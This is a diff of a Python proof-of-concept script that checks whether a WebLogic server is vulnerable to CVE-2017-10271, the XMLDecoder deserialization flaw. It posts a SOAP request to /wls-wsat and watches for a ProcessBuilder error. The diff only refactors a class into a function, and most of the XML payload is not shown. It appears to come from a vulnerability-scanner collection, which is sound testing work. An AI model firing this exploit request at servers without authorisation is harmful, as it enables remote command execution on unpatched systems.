@@ -9,13 +9,7 @@ description: weblogic /wls-wsat/CoordinatorPortType接口存在命令执行。
 import sys
 import requests
 import warnings
-
-
-class xmldecoder_exec_BaseVerify:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['weblogic XMLdecoder反序列化漏洞(CVE-2017-10271)', '', '']
         headers = {
             "Content-Type":"text/xml;charset=UTF-8",
@@ -47,7 +41,7 @@ class xmldecoder_exec_BaseVerify:
           <soapenv:Body/> 
         </soapenv:Envelope>
         '''
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.status_code == 500 and r"java.lang.ProcessBuilder" in req.text:
@@ -61,5 +55,5 @@ class xmldecoder_exec_BaseVerify:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = xmldecoder_exec_BaseVerify(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
